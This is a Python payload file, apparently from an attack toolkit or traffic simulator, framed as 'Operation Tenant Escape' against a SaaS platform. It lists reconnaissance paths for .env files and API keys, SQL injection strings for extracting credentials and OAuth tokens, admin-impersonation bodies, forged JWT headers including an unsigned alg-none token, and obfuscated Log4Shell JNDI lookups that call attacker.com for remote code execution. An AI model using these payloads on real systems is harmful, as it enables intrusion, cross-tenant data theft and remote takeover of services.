"""
SaaS/Tech payloads — Operation Tenant Escape
Targeting CloudMatrix SaaS platform.
"""

RECON_PATHS = [
    "/api/docs", "/swagger", "/swagger.json", "/openapi.json",
    "/api/v1", "/api/v2",
    "/.env", "/.env.production", "/.env.local", "/.env.backup",
    "/api/v1/admin", "/api/v1/tenants", "/api/v1/users",
    "/api/v1/config", "/api/keys",
    "/admin", "/admin/impersonate",
    "/oauth/token", "/oauth/.well-known/openid-configuration",
    "/api/v1/billing", "/graphql",
]

GRAPHQL_INTROSPECTION = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__schema{queryType{name}mutationType{name}}}"}',
    '{"query":"{__type(name:\\"User\\"){fields{name type{name}}}}"}',
    '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}',
]

SCANNER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "python-requests/2.28.0",
    "Go-http-client/1.1",
    "APIScanner/2.0 (custom)",
    "zgrab/0.x",
    "GraphQLmap/1.0",
    "WFuzz/3.1.0",
]

TENANT_IDS = list(range(2001, 2051))

API_SQLI = [
    "' OR 1=1--",
    "include=' OR 1=1--",
    "tenant=' UNION SELECT * FROM tenants--",
    "1 UNION SELECT api_key,secret,tenant_id FROM api_credentials--",
    "' OR EXISTS(SELECT * FROM tenants WHERE tier='enterprise')--",
    "1; SELECT * FROM oauth_tokens--",
    "' UNION SELECT null,client_secret,access_token FROM oauth_clients--",
    "tenant_id=' UNION SELECT * FROM billing--",
]

ADMIN_PAYLOADS = [
    {"role": "admin", "tenant_id": "1", "impersonate": "true"},
    {"role": "superadmin", "user_id": "1", "bypass": "true"},
    {"scope": "admin:all", "grant_type": "client_credentials"},
]

JWT_FORGERY_HEADERS = [
    {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."},
    {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwidGVuYW50IjoiZ2xvYmFsIn0.forged"},
    {"X-Internal-Token": "internal-bypass-token-2024"},
    {"X-Admin-Override": "true", "X-Tenant-ID": "0"},
]

LOG4SHELL_SAAS = [
    {
        "ua": "${jndi:ldap://attacker.com/saas-exploit}",
        "x_request_id": "${jndi:ldap://attacker.com/saas-exploit}",
        "x_forwarded_host": "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
    },
    {
        "ua": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/Exploit}",
        "x_request_id": "${jndi:rmi://attacker.com:1099/saas-rce}",
        "x_forwarded_host": "${jndi:dns://attacker.com/saas-backend}",
    },
    {
        "ua": "${jndi:ldap://192.168.1.1:1389/SaaSExploit}",
        "x_request_id": "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/tenant-escape}",
        "x_forwarded_host": "${jndi:ldap://attacker.com/java-backend}",
    },
]
